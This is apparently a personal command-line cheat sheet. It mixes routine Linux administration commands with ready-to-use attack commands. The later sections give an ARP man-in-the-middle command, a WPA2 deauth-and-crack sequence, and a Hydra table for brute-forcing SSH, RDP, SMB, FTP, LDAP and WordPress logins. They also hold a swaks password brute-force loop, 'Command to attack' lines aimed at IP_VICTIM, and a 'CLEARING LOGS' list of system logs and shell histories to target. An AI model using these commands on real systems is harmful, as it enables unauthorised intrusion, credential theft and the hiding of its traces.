# Command Line Fu
command to help out for when you in the terminal\
--------------------------------------------------------\
**###normal rsync**\
rsync -avzh root@source.com:/pwd/ destination/pwd/file   ###from server to server\
rsync -avh thisfolder tootherfolder   ##works like diff will only copy what is not there\
\
**###jump via another host that can connect to destination**\
rsync -avzh -e "ssh -J root@source1.com,root@source2.com" root@source.com:/pwd/ destination/pwd/file\
\
**###RDP Connect###**\
xfreerdp /monitor-list\
xfreerdp /monitors:0,1 /multimon /u:username@workgroup /v:computer.localhost.com\
\
**###QEMU KVM VNC Connect###**\
virt-manager -c qemu+ssh://username@localhost.computer.com/system\
\
**###pivot ssh**\
ssh -t root@source.com ssh root@destination.com\
ssh -J "root@source1.com,root@source2.com" root@destination.com\
\
**###ettercap**\
ettercap -T -S -q -M arp:remote /<ipaddr_client>// /<ipaddr_router>// #ettercap mitm\
\
**###only show mac address and vendor with ipaddress**\
nmap -sn 10.10.10.0/24 | awk '/Nmap scan report for/{printf $5;}/MAC Address:/{print " => "substr($0, index($0,$3)) }' | sort\
\
**###short update and upgrade**\
apt update ; apt upgrade\
\
**###GNU parallel bash script run multiple servers**\
parallel --linebuffer -P 200 --eta -S 10/root@srv47.hostserv.co.za -S 10/root@srv155.hostserv.co.za -S 10/root@srv176.hostserv.co.za --trc my_script.sh bash ::: ./my_script.sh | tee output.txt\
\
**###change mnt directory to mount drive**\
ls -lsah / | egrep -e "mnt" | awk {'print $2,$6,$10'} | sed -e "s/mnt/mount drive/g" | cut -d "e" -f 1\
\
**###calculator**\
echo $((4 + 2))\
\
**###samba connect**\
smbclient -L 10.0.0.50\
smbclient -N -L \\\\YOUR_TARGET_IP\\DIRECTORY_NAME\
smbclient //10.0.0.50/sharedFolderName/ -m SMB3\
\
**###change mac address**\
ifconfig eth0 down \
ifconfig eth0 hw ether 02:5d:6c:e8:8d:b2 \
ifconfig eth0 up \
\
**###check if eth0 mac address has changed**\
tcpdump -i eth0 -e -n "icmp and host 192.168.0.2"\
\
**###mac to monitor mode**\
ifconfig eth0 down \
ifconfig eth0 mode monitor \
ifconfig eth0 up \
\
**###generate ssh keys**\
ssh-keygen -t ed25519 -C "your_email@example.com"\
\
<sup><sub>Note: If you are using a legacy system that doesn't support the Ed25519 algorithm, use:</sub></sup>\
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"\
\
**###generate ssl certificate 2048 bit strong - no CA**\
openssl genrsa -out epp.key 2048\
openssl req -new -x509 -key epp.key -out epp.crt -days 365\
cat epp.key epp.crt > epp.pem\
\
**###show contents of ssl certificate**\
openssl s_client x509 -in name.crt -text -noout\
\
**###connect to server**\
openssl s_client -connect server.com -cert name.crt -key name.key -verify 10 -debug\
\
**###connect to server check port**\
telnet 123.456.789.012 3386\
\
**###check the connection**\
tcpdump -n tcp and port 700\
\

**###send email from terminal**\
swaks --to user@email.com --from user@email.com --server mail.server.com --auth LOGIN --auth-user user@email.com --auth-password ABDDEEFFbcdef123456 --tls

**###connect mysql remote machine**\
mysql -h SERVER.COM -u USER -pPASSWORD -e 'use DATABASE; select * from TABLENAME where COLUMN = "122345";'\
\
**###check mysql and its logs**\
mysql -se "SHOW VARIABLES" | grep -e log_error -e general_log -e slow_query_log\
mysql -e "SELECT @@GLOBAL.log_error"\
tail -f $(mysql -Nse "SELECT @@GLOBAL.log_error")\
mysql -e "SHOW FULL PROCESSLIST;"\
\
**###parallel - multithreading usage**\
ls -lsah | parallel echo\
seq 1 | parallel /usr/bin/php8.1 test.php\
seq 10 | parallel /usr/bin/python3 --version\
\
**###for loop file**\
for i in $(cat list);do echo $i; done\
\
**###TBW of an SSD harddrive**\
//////-------------------------------------------------------------\
$ fdisk -l\
Disk /dev/sda: 232.89 GiB, 250059350016 bytes, 488397168 sectors\
Disk model: Samsung SSD 850 \
Units: sectors of 1 * 512 = 512 bytes\
Sector size (logical/physical): 512 bytes / 512 bytes\
I/O size (minimum/optimal): 512 bytes / 512 bytes\
Disklabel type: gpt\
Disk identifier: EE9E96CA-39C9-4D14-8DFD-00B550B5E579\
\
Device       Start       End   Sectors   Size Type\
/dev/sda1     2048   1050623   1048576   512M EFI System\
/dev/sda2  1050624 488396799 487346176 232.4G Linux filesystem\
\
$ sudo smartctl -Ai /dev/sda | grep -E 'Sector Size|Total_LBAs_Written'\
Sector Size:      512 bytes logical/physical\
241 Total_LBAs_Written      0x0032   099   099   000    Old_age   Always       -       1214641768\
\
$ echo $(calc 1214641768*512/1024^3) "GB"\
    73.20892595080658793449 GB

\
/////ONELINER\
tbw=$(smartctl -Ai /dev/sda | grep -i 'Total_LBAs_Written' | awk '{print $10}' | xargs -I % calc %*512/1024^4 | sed -e 's/~//g'); echo $tbw "TBW"\
73.20892595080658793449 TBW\
\
TBW of Samsung SSD 850 is 300TBW\
300 - 74 = 226 tBW remaining\

//////-------------------------------------------------------------\
**###linux screen**\
screen -S "mylittlescreen" -d -m\
screen -r "mylittlescreen" -X stuff $'ls\n'\
\
**###random mac address**\
///file NAME: mac.sh
```
#!/bin/bash
LC_CTYPE=C
MAC=00:14:7C #3COM CARD
for i in {1..3}
do
    IFS= read -d '' -r -n 1 char < /dev/urandom
    MAC+=$(printf -- ':%02x\n' "'$char")
done
printf '%s\n' "$MAC"

# ----------------------------------------
# chmod +x mac.sh
# $ ./mac.sh 
# ba:aa:92:cf:38:2e
# use mac/oui address lookup file in git
```
# TCPDUMP 
Filtering ICMP echo reply echo request Packets with tcpdump command\
--------------------------------------------------------\
0 Echo Reply\
3 Destination Unreachable\
4 Source Quench\
5 Redirect\
8 Echo\
11 Time Exceeded\
--------------------------------------------------------\
With the following command, we can filter ICMP echo-reply,

**##### tcpdump -i eth0 “icmp[0] == 0”

To filter ICMP echo-requests, we can use this tcpdump command.

**##### tcpdump -i eth0 “icmp[0] == 8”

How to use tcpdump to capture ICMPv6 packets
In IPv6, an IPv6 packet is 40 bytes long, and the first 8 bits of the ICMPv6 header specify its type. We can use this tcpdump command to filter all ICMPv6 packets.

**##### tcpdump -i eth0 icmp6

We can use this tcpdump command to filter ICMPv6 echo-requests.

**##### tcpdump -i eth0 “icmp6 && ip6[40] == 128”

In the latest versions of tcpdump/libpcap, we can use the following command to capture ICMPv6 echo packets.

**##### tcpdump -i eth0 ‘icmp6[icmp6type]=icmp6-echo’





# AWK Commands
replace certain linux commands with AWK\
--------------------------------------------------------\

| awk_command  | linux_command | long way/description |
| ------------- | ------------- | ------------- |
| awk 1 test.sh  | cat test.sh  | awk '{print $0}' test.sh |
| awk '{IGNORECASE=1}/next/' test.sh | grep -i 'next' test.sh  | |
| awk '{gsub(/Next/, "linuxrules"); print}' test.sh | sed 's/Next/linux/' test.sh | |
| awk 'END{print NR}' test.sh | wc -l test.sh | |
| awk 'FNR <= 10' test.sh | head -n 10 test.sh | | 
| awk 'a[$0]++' test.sh | uniq -D test.sh | duplicates add ! to remove:: !a[$0]++ |

# WIFI HACKING
Commands used in wifi WPA2 hacking\
--------------------------------------------------------\
you will need a wifi card that can do packet injection and monitor mode... \
to test this use the following commands\

check card supports monitor mode\
**##### ifconfig wlan0 down\
**##### iwconfig wlan0 mode monitor\
**##### ifconfig wlan0 up\
**##### iwconfig ----- check if card is in monitor mode under man\

check card supports packet injection\
**##### terminal 1: airodump-ng wlan0\
**##### terminal 1: airodump-ng -c 2 -w packetcapture -d 00:00:00:00:00:00 wlan0\
**##### terminal 2: aireplay-ng --deauth -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan0\
**##### terminal 3: aircrack-ng packcapture.pcap -w passwords.txt


# SNORT RULES AND RUN
/etc/snort/rules/local.rules

alert icmp any any -> 192.168.0.0/24 any (msg: "NMAP ping sweep Scan"; dsize:0;sid:10000004; rev: 1;)

alert tcp any any -> 192.168.0.0/24 any (msg: "NMAP TCP Scan";sid:10000005; rev:2; )

alert tcp any any -> 192.168.0.0/24 any (msg:"Nmap XMAS Tree Scan"; flags:FPU; sid:1000006; rev:1; )

alert tcp any any -> 192.168.0.0/24 any (msg:"Nmap FIN Scan"; flags:F; sid:1000008; rev:1;)

alert tcp any any -> 192.168.0.0/24 any (msg:"Nmap NULL Scan"; flags:0; sid:1000009; rev:1; )

alert udp any any -> 192.168.0.0/24 any ( msg:"Nmap UDP Scan"; sid:1000010; rev:1; )

**##### terminal 1: sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i wlp1s0f0









# Hydra-Cheatsheet
Hydra Password Cracking Cheetsheet

The following table uses the $ip variable which can be set with the following command:  

`export ip 10.10.10.1`


| Command | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
| hydra -P password-file.txt -v $ip snmp                                                                                                    | Hydra brute force against SNMP                       |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                       | Hydra FTP known user and rockyou password list       |
| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                              | Hydra SSH using list of users and passwords          |
| hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                         | Hydra SSH using a known password and a username list |
| hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt                                                                                         | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                          | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                         | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                 | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                           | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                             | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f | SMB Brute Forcing |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f | LDAP Brute Forcing |
  
# swaks bruteforce to send email 
for i in $(cat passwords.txt); do echo "=== Trying Password: "$i"===" ; swaks --to user@email.com --from user@email.com --server mail.server.com --auth LOGIN --auth-user user@email.com --auth-password $i --tls --data "Subject: hello\n wellcome"; done

# Brute Force hydra more commands
SSH
Command to attack:
hydra -l user -P passwords.txt IP_VICTIM ssh


HTTP-POST LOGIN
Command to attack:
sudo hydra -l user -p passwords.txt IP_VICTIM http-post-form ‘/path/login:username_field&password_field=^PASS^:Error Message’

Username Field: Firefox F12 -> Network -> Send Login.
Password Field: Firefox F12 -> Network -> Send Login.

FTP
Command to attack:
hydra -l user -P passwords.txt IP_VICTIM ftp

MYSQL
hydra -l user -P passwords.txt IP_VICTIM mysql

SMB
hydra -l user -P passwords.txt IP_VICTIM smb

CLEARING LOGS

for i in /var/log/lastlog /var/log/messages /var/log/warn /var/log/wtmp /var/log/poplog /var/log/qmail /var/log/smtpd /var/log/telnetd /var/log/secure /var/log/auth /var/log/auth.log /var/log/cups/access_log /var/log/cups/error_log /var/log/thttpd_log /var/log/spooler /var/spool/tmp /var/spool/errors /var/spool/locks /var/log/nctfpd.errs /var/log/acct /var/apache/log /var/apache/logs /usr/local/apache/log /usr/local/apache/logs /usr/local/www/logs/thttpd_log /var/log/news /var/log/news/news /var/log/news.all /var/log/news/news.all /var/log/news/news.crit /var/log/news/news.err /var/log/news/news.notice /var/log/news/suck.err /var/log/news/suck.notice /var/log/xferlog /var/log/proftpd/xferlog.legacy /var/log/proftpd.xferlog /var/log/proftpd.access_log /var/log/httpd/error_log /var/log/httpsd/ssl_log /var/log/httpsd/ssl.access_log /var/adm /var/run/utmp /etc/wtmp /etc/utmp /etc/mail/access /var/log/mail/info.log /var/log/mail/errors.log /var/log/httpd/*_log /var/log/ncftpd/misclog.txt /var/account/pacct /var/log/snort /var/log/bandwidth /var/log/explanations /var/log/syslog /var/log/user.log /var/log/daemons/info.log /var/log/daemons/warnings.log /var/log/daemons/errors.log /etc/httpd/logs/error_log /etc/httpd/logs/*_log /var/log/mysqld/mysqld.log /root/.ksh_history /root/.bash_history /root/.sh_history /root/.history /root/*_history /root/.login /root/.logout /root/.bash_logut /root/.Xauthority /var/log/yum.log /var/log/wtmp /var/log/utmp /var/log/secure /var/log/mysqld.log /var/log/boot.log /var/log/lighttpd /var/log/httpd/ /var/log/qmail/ /var/log/maillog /var/log/cron.log /var/log/kern.log /var/log/auth.log /var/log/message /var/log/lastlog /var/adm/lastlog /usr/adm/lastlog /var/log/lastlog /etc/utmp /etc/wtmp /var/run/utmp /var/apache/log /var/apache/logs /usr/local/apache/log /usr/local/apache/logs /root/.bash_logout /root/.bash_history /root/.ksh_history /tmp/logs /opt/lampp/logs/access_log /var/log/nginx/access.log /logs/agent_lo /logs/referer_log /logs/access_log /var/log/apache2/access.log /var/log/apache2/error.log /var/log/apache2/other_vhosts_access.log /var/spool/exim/log/paniclog /var/log/exim-panic.log /var/spool/exim/log/paniclog /var/log/exim/panic /var/log/exim_mainlog /var/log/exim_rejectlog /var/log/exim_paniclog /var/log/exim_processlog /var/log/apache2/access.log /var/log/httpd/access_log /var/log/apache2/access_log /var/log/apache2/error.log /var/log/httpd/error_log /var/log/apache2/error_log ; do ls -lFaZh $i ; done






